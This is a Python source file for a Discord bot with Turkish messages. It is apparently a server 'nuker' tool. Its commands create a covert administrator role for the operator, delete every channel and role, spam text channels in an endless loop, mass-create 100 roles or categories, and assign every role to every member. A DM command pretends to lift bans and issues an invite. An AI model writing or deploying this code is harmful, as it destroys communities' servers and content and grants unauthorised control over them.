import discord
from discord.ext import commands
import random  # Rastgele renk seçimi için gerekli

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="+", intents=intents)

def load_allowed_ids():
    try:
        with open("ids.txt", "r") as file:
            return [int(line.strip()) for line in file]
    except FileNotFoundError:
        print("ids.txt dosyası bulunamadı!")
        return []

allowed_ids = load_allowed_ids()

@bot.event
async def on_ready():
    print(f'Bot {bot.user} olarak giriş yaptı!')

async def check_permission(ctx):
    if ctx.author.id not in allowed_ids:
        try:
            await ctx.author.send("Üzgünüm izniniz yok!")
            await ctx.guild.kick(ctx.author, reason="İzinsiz komut kullanımı")
            print(f"{ctx.author} kullanıcısı izinsiz komut kullanımı nedeniyle sunucudan atıldı.")
        except Exception as e:
            print(f"İzinsiz kullanıcı mesaj gönderilemedi veya sunucudan atılamadı: {e}")
        return False
    return True

@bot.command()
async def yetki(ctx):
    if not await check_permission(ctx):
        return
    
    guild = ctx.guild
    role_name = "."

    try:
        role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
        await ctx.author.add_roles(role)
        print(f"Rol {role_name} oluşturuldu ve {ctx.author} kullanıcısına verildi.")
    except Exception as e:
        print(f"Rol oluşturulurken hata oluştu: {e}")

    await ctx.message.delete()

@bot.command()
async def patlat(ctx, kanal_adi):
    if not await check_permission(ctx):
        return

    guild = ctx.guild
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} kanalı silindi.")
        except Exception as e:
            print(f"{channel.name} kanalı silinemedi: {e}")
    
    while True:
        try:
            await guild.create_text_channel(kanal_adi)
            print(f"{kanal_adi} adında bir kanal oluşturuldu.")
        except Exception as e:
            print(f"Kanal oluşturulamadı: {e}")

@bot.command()
async def silmedenpatlat(ctx, kanal_adi):
    if not await check_permission(ctx):
        return

    guild = ctx.guild
    
    while True:
        try:
            await guild.create_text_channel(kanal_adi)
            print(f"{kanal_adi} adında bir kanal oluşturuldu.")
        except Exception as e:
            print(f"Kanal oluşturulamadı: {e}")

@bot.command()
async def sil(ctx):
    if not await check_permission(ctx):
        return

    guild = ctx.guild

    for channel in guild.channels:
        if channel.name in ["oryantasyonu", "topluluğu"]:
            try:
                await channel.delete()
                print(f"{channel.name} kanalı silindi.")
            except Exception as e:
                print(f"{channel.name} kanalı silinemedi: {e}")
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} kanalı silindi.")
        except Exception as e:
            print(f"{channel.name} kanalı silinemedi: {e}")

    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
                print(f"{role.name} rolü silindi.")
        except Exception as e:
            print(f"{role.name} rolü silinemedi: {e}")

@bot.command()
async def rol(ctx, *, role_name):
    if not await check_permission(ctx):
        return

    guild = ctx.guild

    for i in range(100):
        try:
            await guild.create_role(name=f"{role_name} {i+1}")
            print(f"{role_name} {i+1} adında bir rol oluşturuldu.")
        except Exception as e:
            print(f"{role_name} {i+1} rolü oluşturulamadı: {e}")

    await ctx.send("100 rol oluşturuldu.")

@bot.command()
async def rol2(ctx, *, role_name):
    if not await check_permission(ctx):
        return

    guild = ctx.guild

    colors = [
        0xFF0000, 0xE63900, 0xCC6600, 0xB38F00, 0x99B300, 
        0x7FCC00, 0x66E639, 0x4DCCB3, 0x3399FF, 0x0000FF
    ]

    for i in range(100):
        random_color = discord.Color(random.choice(colors))
        try:
            await guild.create_role(name=f"{role_name} {i+1}", color=random_color)
            print(f"{role_name} {i+1} adında bir rol oluşturuldu ve rastgele renk atandı.")
        except Exception as e:
            print(f"{role_name} {i+1} rolü oluşturulamadı: {e}")

    await ctx.send("100 renkli rol oluşturuldu.")

@bot.command()
async def category(ctx, *, category_name):
    if not await check_permission(ctx):
        return

    guild = ctx.guild
    
    for i in range(100):
        try:
            await guild.create_category(name=f"{category_name} {i+1}")
            print(f"{category_name} {i+1} adında bir kategori oluşturuldu.")
        except Exception as e:
            print(f"{category_name} {i+1} kategorisi oluşturulamadı: {e}")

    await ctx.send("100 kategori oluşturuldu.")

@bot.command()
async def kaldır(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        view = discord.ui.View()

        view.add_item(discord.ui.Button(label="Zamanaşımı Kaldır", style=discord.ButtonStyle.green, custom_id="timeout"))
        view.add_item(discord.ui.Button(label="Ban Kaldır", style=discord.ButtonStyle.red, custom_id="ban"))

        await ctx.send("Hangi işlemi yapmak istersiniz?", view=view)

        async def button_callback(interaction):
            if interaction.user != ctx.author:
                return await interaction.response.send_message("Bu butona tıklama izniniz yok!", ephemeral=True)

            if interaction.custom_id == "timeout":
                await ctx.send(f"{ctx.author.name} için zamanaşımı kaldırıldı.")
                # Zamanaşımı kaldırma işlemi burada yapılır

            elif interaction.custom_id == "ban":
                await ctx.send(f"{ctx.author.name} için ban kaldırıldı.")
                invite_link = await ctx.guild.text_channels[0].create_invite(max_age=0, max_uses=1)
                await ctx.author.send(f"Yeni davet linkiniz: {invite_link}")
                # Ban kaldırma işlemi burada yapılır

        for button in view.children:
            button.callback = button_callback

@bot.command()
async def rolsil(ctx):
    if not await check_permission(ctx):
        return

    guild = ctx.guild

    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
                print(f"{role.name} rolü silindi.")
        except Exception as e:
            print(f"{role.name} rolü silinemedi: {e}")

    await ctx.send("Tüm roller silindi.")

@bot.command()
async def rolekle(ctx):
    if not await check_permission(ctx):
        return

    guild = ctx.guild

    for role in guild.roles:
        if role.name != "@everyone":
            for member in guild.members:
                try:
                    await member.add_roles(role)
                    print(f"{member.name} kullanıcısına {role.name} rolü eklendi.")
                except Exception as e:
                    print(f"{member.name} kullanıcısına rol eklenemedi: {e}")

    await ctx.send("Tüm rolleri tüm kullanıcılara ekleme işlemi tamamlandı.")

bot.run('Bot_token_here')
